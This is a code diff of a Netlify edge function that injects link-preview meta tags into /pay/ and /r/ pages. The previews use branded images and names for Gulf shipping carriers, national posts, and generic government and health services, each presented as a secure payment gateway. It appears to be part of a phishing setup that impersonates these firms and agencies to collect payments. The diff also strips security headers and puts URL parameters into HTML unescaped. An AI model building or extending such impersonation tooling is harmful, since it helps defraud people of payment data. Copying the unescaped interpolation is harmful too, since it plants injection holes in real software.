@@ -1,31 +1,43 @@
-// Netlify Edge Function to inject Open Graph meta tags server-side
-// This runs BEFORE JavaScript and ensures social media crawlers see correct OG tags
-
 export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
   try {
-    // Get the URL and query parameters
     const url = new URL(request.url);
-    const company = url.searchParams.get('company') || 'aramex';
-    const title = url.searchParams.get('title');
-    const currency = url.searchParams.get('currency');
     const path = url.pathname;
 
-    // Only process /pay/* paths
-    if (!path.startsWith('/pay/')) {
+    // Process both /pay/* and /r/* paths for OG tags
+    const shouldProcess = path.startsWith('/pay/') || path.startsWith('/r/');
+    
+    if (!shouldProcess) {
       return context.next();
     }
 
-    console.log('OG Injector: Processing', { path, company, title, currency });
+    // Extract company/service from URL
+    let company = url.searchParams.get('company') || url.searchParams.get('service') || 'aramex';
+    let serviceType = 'shipping';
+    
+    // Detect service type from path
+    if (path.includes('/chalet/')) {
+      serviceType = 'chalet';
+      company = url.searchParams.get('service') || 'chalet';
+    } else if (path.includes('/health/')) {
+      serviceType = 'health';
+      company = url.searchParams.get('service') || 'health';
+    } else if (path.includes('/government/')) {
+      serviceType = 'government';
+      company = url.searchParams.get('service') || 'government';
+    } else if (path.includes('/logistics/')) {
+      serviceType = 'logistics';
+      company = url.searchParams.get('service') || 'logistics';
+    }
 
-    // Fetch the original HTML
+    console.log('OG Injector:', { path, company, serviceType });
+
     const response = await context.next();
     const html = await response.text();
-
-    // Get the current domain dynamically
     const origin = url.origin;
 
-    // Company to OG image mapping (using correct .jpg extension and dynamic domain)
-    const companyImages: Record<string, string> = {
+    // Comprehensive company/service to OG image mapping
+    const serviceImages: Record<string, string> = {
+      // Shipping services
       'aramex': `${origin}/og-aramex.jpg`,
       'dhl': `${origin}/og-dhl.jpg`,
       'dhlkw': `${origin}/og-dhl.jpg`,
@@ -42,22 +54,31 @@ export default async function handler(request: Request, context: { next: () => P
       'kwpost': `${origin}/og-kwpost.jpg`,
       'qpost': `${origin}/og-qpost.jpg`,
       'omanpost': `${origin}/og-omanpost.jpg`,
-      'bahpost': `${origin}/og-bahpost.jpg`
+      'bahpost': `${origin}/og-bahpost.jpg`,
+      'albaraka': `${origin}/og-albaraka.jpg`,
+      'alfuttaim': `${origin}/og-alfuttaim.jpg`,
+      'alshaya': `${origin}/og-alshaya.jpg`,
+      'shipco': `${origin}/og-shipco.jpg`,
+      'hellmann': `${origin}/og-hellmann.jpg`,
+      'dsv': `${origin}/og-dsv.jpg`,
+      'jinaken': `${origin}/og-jinaken.jpg`,
+      'genacom': `${origin}/og-genacom.jpg`,
+      
+      // Service type defaults
+      'chalet': `${origin}/og-chalet.jpg`,
+      'health': `${origin}/og-health.jpg`,
+      'government': `${origin}/og-government.jpg`,
+      'logistics': `${origin}/og-logistics.jpg`,
+      'payment': `${origin}/og-payment.jpg`,
     };
 
-    // Get OG image for the company, fallback to aramex
-    const ogImage = companyImages[company.toLowerCase()] || `${origin}/og-aramex.jpg`;
-
-    // Company display names
-    const companyNames: Record<string, string> = {
-      'aramex': 'أرامكس',
-      'dhl': 'دي إتش إل',
-      'dhlkw': 'دي إتش إل الكويت',
-      'dhlqa': 'دي إتش إل قطر',
-      'dhlom': 'دي إتش إل عُمان',
-      'dhlbh': 'دي إتش إل البحرين',
-      'fedex': 'فيديكس',
-      'ups': 'يو بي إس',
+    // Service display names
+    const serviceNames: Record<string, string> = {
+      // Shipping
+      'aramex': 'أرامكس - Aramex',
+      'dhl': 'دي إتش إل - DHL',
+      'fedex': 'فيديكس - FedEx',
+      'ups': 'يو بي إس - UPS',
       'empost': 'البريد الإماراتي',
       'smsa': 'سمسا',
       'zajil': 'زاجل',
@@ -66,73 +87,99 @@ export default async function handler(request: Request, context: { next: () => P
       'kwpost': 'البريد الكويتي',
       'qpost': 'البريد القطري',
       'omanpost': 'البريد العُماني',
-      'bahpost': 'البريد البحريني'
+      'bahpost': 'البريد البحريني',
+      'albaraka': 'مجموعة البركة',
+      'alfuttaim': 'مجموعة الفطيم',
+      'alshaya': 'مجموعة الشايع',
+      'shipco': 'شركة الشحن العالمية',
+      'hellmann': 'هايلمان العالمية',
+      'dsv': 'دي إس في',
+      'jinaken': 'جيناكم',
+      'genacom': 'جيناكم',
+      
+      // Service types
+      'chalet': 'حجز الشاليهات',
+      'health': 'الخدمات الصحية',
+      'government': 'الخدمات الحكومية',
+      'logistics': 'الخدمات اللوجستية',
+      'payment': 'خدمات الدفع',
     };
 
-    const companyName = companyNames[company.toLowerCase()] || company;
+    const serviceName = serviceNames[company.toLowerCase()] || company;
+    
+    // Service type descriptions
+    const serviceDescriptions: Record<string, string> = {
+      'shipping': 'خدمات الشحن والتوصيل السريع في دول الخليج',
+      'chalet': 'احجز شاليه أحلامك في دول الخليج بأسعار مميزة',
+      'health': 'خدمات طبية وصحية معتمدة - احجز موعدك الآن',
+      'government': 'الخدمات الحكومية والرسوم الرسمية - ادفع بسهولة وأمان',
+      'logistics': 'حلول لوجستية متكاملة - تخزين وشحن وتوزيع',
+      'payment': 'بوابة دفع آمنة وموثوقة',
+    };
 
-    // Generate dynamic title and description
-    const ogTitle = title || `${companyName} - إكمال الدفع`;
-    const ogDescription = currency
-      ? `إكمال دفع ${companyName} بـ ${currency} - بوابة دفع آمنة وموثوقة`
-      : `إكمال دفع ${companyName} - بوابة دفع آمنة وموثوقة`;
-    const ogUrl = url.href;
+    const ogImage = serviceImages[company.toLowerCase()] || 
+                    serviceImages[serviceType] || 
+                    `${origin}/og-aramex.jpg`;
 
-    // Generate OG meta tags
+    const ogTitle = `${serviceName} - نظام الدفع الآمن`;
+    const ogDescription = serviceDescriptions[serviceType] || 
+                         `إكمال دفع ${serviceName} - بوابة دفع آمنة وموثوقة في دول الخليج`;
+
     const ogTags = `
     <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="${ogUrl}" />
+    <meta property="og:url" content="${url.href}" />
     <meta property="og:title" content="${ogTitle}" />
     <meta property="og:description" content="${ogDescription}" />
     <meta property="og:image" content="${ogImage}" />
+    <meta property="og:image:secure_url" content="${ogImage}" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     <meta property="og:image:type" content="image/jpeg" />
-    <meta property="og:image:alt" content="${companyName} Payment Gateway" />
-    <meta property="og:site_name" content="Gulf Payment Gateway" />
+    <meta property="og:image:alt" content="${serviceName}" />
+    <meta property="og:site_name" content="نظام الدفع الموحد - دول الخليج" />
     <meta property="og:locale" content="ar_AR" />
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@GulfPayment" />
     <meta name="twitter:title" content="${ogTitle}" />
     <meta name="twitter:description" content="${ogDescription}" />
     <meta name="twitter:image" content="${ogImage}" />
-    <meta name="twitter:image:alt" content="${companyName} Payment Gateway" />
+    <meta name="twitter:image:alt" content="${serviceName}" />
+    
+    <!-- WhatsApp specific -->
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:determiner" content="the" />
     `;
 
-    // Remove existing OG tags (if any) and inject new ones
-    // This regex removes existing OG and Twitter meta tags
+    // Remove existing OG and Twitter tags
     let modifiedHtml = html.replace(
-      /<meta\s+(?:property|name)=["']\w*og:\w*["'][^>]*>\s*/gi,
-      ''
-    ).replace(
-      /<meta\s+name=["']twitter:\w*["'][^>]*>\s*/gi,
+      /<meta\s+(?:property|name)=["'](?:og:|twitter:)[^"']+["'][^>]*>\s*/gi,
       ''
     );
 
-    // Inject new OG tags after <head> tag
+    // Inject new OG tags after <head>
     modifiedHtml = modifiedHtml.replace(
       /<head[^>]*>/i,
       (match) => `${match}\n${ogTags.trim()}`
     );
 
-    console.log('OG Injector: Injected tags for', { company, currency, title: ogTitle, ogImage });
+    console.log('OG Injector: Tags injected', { company, serviceType, serviceName, ogImage });
 
-    // Return modified HTML with same headers
     return new Response(modifiedHtml, {
       status: response.status,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'public, max-age=0, must-revalidate',
-        'X-Content-Type-Options': 'nosniff',
-        'X-Frame-Options': 'SAMEORIGIN'
+        'X-OG-Injected': 'true',
+        'X-Service-Type': serviceType,
+        'X-Service-Name': company
       }
     });
 
   } catch (error) {
     console.error('OG Injector Error:', error);
-    // If anything goes wrong, fall back to original response
     return context.next();
   }
 }
